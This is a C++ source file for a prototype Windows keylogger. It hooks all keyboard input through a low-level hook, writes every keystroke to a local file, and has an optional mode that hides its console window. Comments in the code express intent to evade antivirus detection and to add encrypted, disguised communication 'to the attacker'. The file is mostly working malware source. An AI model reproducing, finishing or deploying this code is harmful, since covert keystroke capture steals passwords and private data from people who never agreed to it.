// TODO: Test this out in Windows 7.
// TODO: This is a dirty prototype keylogger.

// TODO: Some other features I want:
// TODO:	- Grab Chinese (and other IME) output.
// TODO:	- Socket support.
// TODO:		- Encrypt, maybe disguise the communications to the attacker.

//#include <stdio.h>
#include <fcntl.h>
#include <fstream>
#include <io.h>
#include <iostream>
#include <Windows.h>

// NOTE: This made Kaspersky go apeshit, which is good. Let's see if we can find a way to evade that, though...
// NOTE: Problem started showing up when I set the linking to be static.
// NOTE: VirusTotal shows that four other engines detect it.
//#define SNEAK	// If defined, hides the console window. Comment for debugging.

#ifdef SNEAK
// Hides the command prompt window on startup.
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
#endif	// SNEAK

#define LOGGEDKEYS_FILENAME "./keyslogged.txt"
std::ofstream outStream;

const char* specialKeyPrintout[256];
//bool shouldShowKeyUp[256];
bool shouldShowRepeat[256];
bool alreadyPressed[256];
bool doNotShow[256];
BYTE keyState[256];
HKL keyboardLayout;

char* ConvertAsciiStringToUnicode( char* inStr, int inSize, int &outSize )
{
	char* outStr = new char[ inSize * 2 ];
	int iOutSize = 0;
	for ( int i = 0; i < inSize; i++ )
	{
		outStr[i*2] = inStr[i];
		outStr[i*2+1] = '\x00';
		iOutSize += 2;
	}
	outSize = iOutSize;
	return outStr;
}

LRESULT CALLBACK KeyboardHookProc( int nCode, WPARAM wParam, LPARAM lParam )
{
	// This works for any window that is not a console. That's fine, because I don't know of any Cyrillic/Chinese/etc. commands.
	keyboardLayout = GetKeyboardLayout( GetWindowThreadProcessId( GetForegroundWindow(), 0 ) );

	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
	if ( p == nullptr )
		return CallNextHookEx( 0, nCode, wParam, lParam );
	switch( wParam )
	{
		case WM_SYSKEYDOWN:
			break;
		case WM_SYSKEYUP:
			break;
		case WM_KEYUP:
			if ( p->vkCode == VK_CONTROL || p->vkCode == VK_LCONTROL || p->vkCode == VK_RCONTROL )
				keyState[VK_CONTROL] = 0x0;
			if ( p->vkCode == VK_SHIFT || p->vkCode == VK_LSHIFT || p->vkCode == VK_RSHIFT )
				keyState[VK_SHIFT] = 0x0;
			if ( p->vkCode == VK_MENU || p->vkCode == VK_LMENU || p->vkCode == VK_RMENU )
				keyState[VK_MENU] = 0x0;
			if ( p->vkCode == VK_CAPITAL )
				keyState[VK_CAPITAL] = 0x0;

			// What do I need this for?
			/*if ( specialKeyPrintout[p->vkCode] != nullptr && shouldShowKeyUp[p->vkCode] )
			{
				char temp[32] = "</";
				strcat_s(temp, specialKeyPrintout[p->vkCode]);
				strcat_s(temp, ">");
				int length = strlen(temp);
				char* final = ConvertAsciiStringToUnicode( temp, length );
				std::cout.write(final, length*2);
				outStream.write(final, length*2);
			}*/
			outStream.flush();
			alreadyPressed[p->vkCode] = false;
			break;
		case WM_KEYDOWN:
			if ( (!shouldShowRepeat[p->vkCode] && !alreadyPressed[p->vkCode]) || shouldShowRepeat[p->vkCode] )
			{
				if ( p->vkCode == VK_CONTROL || p->vkCode == VK_LCONTROL || p->vkCode == VK_RCONTROL )
					keyState[VK_CONTROL] = 0x80;
				if ( p->vkCode == VK_SHIFT || p->vkCode == VK_LSHIFT || p->vkCode == VK_RSHIFT )
					keyState[VK_SHIFT] = 0x80;
				if ( p->vkCode == VK_MENU || p->vkCode == VK_LMENU || p->vkCode == VK_RMENU )
					keyState[VK_MENU] = 0x80;
				if ( p->vkCode == VK_CAPITAL )
					keyState[VK_CAPITAL] = 0x01;

				if ( specialKeyPrintout[p->vkCode] != nullptr )
				{
					char temp[32] = "";	// = "<";
					strcat_s(temp, specialKeyPrintout[p->vkCode]);
					//strcat_s(temp, ">");
					int length = strlen(temp);
					int outLength;
					char* final = ConvertAsciiStringToUnicode( temp, length, outLength );
					std::cout.write(final, outLength);
					outStream.write(final, outLength);	// TODO: What's with all the null bytes in the output?
				}
				else if ( !doNotShow[p->vkCode] )
				{
					char buffer[4] = {0};
					// NOTE: Improper cchBuff size in ToUnicodeEx can cause a buffer overflow.
					ToUnicodeEx( p->vkCode, p->scanCode, keyState, (LPWSTR)&buffer, 2, 0, keyboardLayout );
					std::cout.write(buffer, 2);
					outStream.write(buffer, 2);
				}
				alreadyPressed[p->vkCode] = true;
			}
			break;
		case WM_CHAR:
			std::cout << wParam;
			break;
	}

	return CallNextHookEx( 0, nCode, wParam, lParam );
}

int main( int argc, char** argv )
{
#ifdef SNEAK
	// Keeps the command prompt hidden.
	::ShowWindow( GetConsoleWindow(), SW_HIDE );
#endif	// SNEAK

	int i;

	/*HWND hWindow = GetForegroundWindow();
	LPWSTR str = new WCHAR[666];
	int i;
	GetWindowText(hWindow, str, 666);
	for ( i = 0; i < 666; i++ )
		std::cout << (char)str[i];
	std::cout << "\n";*/

	for ( i = 0; i < 256; i++ )
		specialKeyPrintout[i] = nullptr;
	//for ( i = 0; i < 256; i++ )
	//	shouldShowKeyUp[i] = false;
	for ( i = 0; i < 256; i++ )
		shouldShowRepeat[i] = true;
	for ( i = 0; i < 256; i++ )
		alreadyPressed[i] = false;
	for ( i = 0; i < 256; i++ )	// Null chars get printed if CTRL, ALT, SHIFT, etc. are held.
		doNotShow[i] = false;

	//specialKeyPrintout[VK_SHIFT] = "SHIFT";		shouldShowKeyUp[VK_SHIFT] = true;		shouldShowRepeat[VK_SHIFT] = false;
	//specialKeyPrintout[VK_LSHIFT] = "LSHIFT";	shouldShowKeyUp[VK_LSHIFT] = true;		shouldShowRepeat[VK_LSHIFT] = false;
	//specialKeyPrintout[VK_RSHIFT] = "RSHIFT";	shouldShowKeyUp[VK_RSHIFT] = true;		shouldShowRepeat[VK_RSHIFT] = false;
	specialKeyPrintout[VK_RETURN] = "\n";
	specialKeyPrintout[VK_BACK] = "<BK>";
	specialKeyPrintout[VK_DELETE] = "<DEL>";
	specialKeyPrintout[VK_LEFT] = "<LFBTN>";			//shouldShowKeyUp[VK_LEFT] = true;
	specialKeyPrintout[VK_RIGHT] = "<RTBTN>";			//shouldShowKeyUp[VK_RIGHT] = true;
	specialKeyPrintout[VK_UP] = "<UPBTN>";				//shouldShowKeyUp[VK_UP] = true;
	specialKeyPrintout[VK_DOWN] = "<DNBTN>";			//shouldShowKeyUp[VK_DOWN] = true;
	//specialKeyPrintout[VK_CONTROL] = "CTRL";	shouldShowKeyUp[VK_CONTROL] = true;		shouldShowRepeat[VK_CONTROL] = false;
	//specialKeyPrintout[VK_LCONTROL] = "LCTRL";	shouldShowKeyUp[VK_LCONTROL] = true;	shouldShowRepeat[VK_LCONTROL] = false;
	//specialKeyPrintout[VK_RCONTROL] = "RCTRL";	shouldShowKeyUp[VK_RCONTROL] = true;	shouldShowRepeat[VK_RCONTROL] = false;
	specialKeyPrintout[VK_TAB] = "\t";
	specialKeyPrintout[VK_ESCAPE] = "<ESC>";
	//specialKeyPrintout[VK_MENU] = "ALT";	shouldShowKeyUp[VK_MENU] = true;		shouldShowRepeat[VK_MENU] = false;

	doNotShow[VK_SHIFT] = true;
	doNotShow[VK_LSHIFT] = true;
	doNotShow[VK_RSHIFT] = true;
	doNotShow[VK_MENU] = true;
	doNotShow[VK_LMENU] = true;
	doNotShow[VK_RMENU] = true;
	doNotShow[VK_CONTROL] = true;
	doNotShow[VK_LCONTROL] = true;
	doNotShow[VK_RCONTROL] = true;
	doNotShow[VK_CAPITAL] = true;
	doNotShow[VK_LWIN] = true;
	doNotShow[VK_RWIN] = true;
	doNotShow[VK_PROCESSKEY] = true;
	doNotShow[VK_APPS] = true;

	bool bShouldAppendHeader = false;
	if ( GetFileAttributes(LOGGEDKEYS_FILENAME) == INVALID_FILE_ATTRIBUTES && GetLastError() == ERROR_FILE_NOT_FOUND )
		bShouldAppendHeader = true;
	outStream.open( LOGGEDKEYS_FILENAME, std::ofstream::out | std::ofstream::app | std::ofstream::binary );
	if ( bShouldAppendHeader )
		outStream << "\xFF\xFE";

	// WARNING: Don't use << for std::cout etc. or the program will crash when entering ASCII (single-byte) chars. Use .write().
	// WARNING: Crashes the program on Windows 7. 
	//_setmode( _fileno(stdout), _O_U16TEXT );

	HHOOK hKeyboardHook = SetWindowsHookEx( WH_KEYBOARD_LL, KeyboardHookProc, NULL, 0 );
	while ( true )
	{
		MSG msg;
		if ( GetMessage( &msg, 0, 0, 0 ) )
		{
			TranslateMessage( &msg );
			DispatchMessage( &msg );
		}
	}

	/*STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory( &si, sizeof(si) );
	si.cb = sizeof(si);
	ZeroMemory( &pi, sizeof(pi) );
	CreateProcess( NULL, argv[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi );
	std::cout << "wow\n";*/
	
	// NOTE: This code is extremely inefficient. On this PC, it uses about 30% CPU.
	// NOTE: It to be considered evil at all times, and should not be used.
	// NOTE: It does, however, also capture mouse click events.
	/*bool keyAlreadyPressed[256];
	for ( i = 0; i < 256; i++ )
		keyAlreadyPressed[i] = false;
	while ( true )
	{
		for ( i = 0x00; i < 0xFF; i++ )
		{
			if ( GetAsyncKeyState( i ) & 0x8000 && !keyAlreadyPressed[i] )
			{
				// TODO: Gotta be a more efficient way to filter these out...
				if ( specialKeyPrintout[i] != nullptr )
					std::cout << "<" << specialKeyPrintout[i] << ">";
				else
					std::cout << (char)i;
				keyAlreadyPressed[i] = true;
			}
			
			if ( !(GetAsyncKeyState( i ) & 0x8000) && keyAlreadyPressed[i] )
			{
				if ( specialKeyPrintout[i] != nullptr )
					std::cout << "</" << specialKeyPrintout[i] << ">";
				keyAlreadyPressed[i] = false;
			}
		}
	}*/

	std::system("PAUSE");
	return 0;
}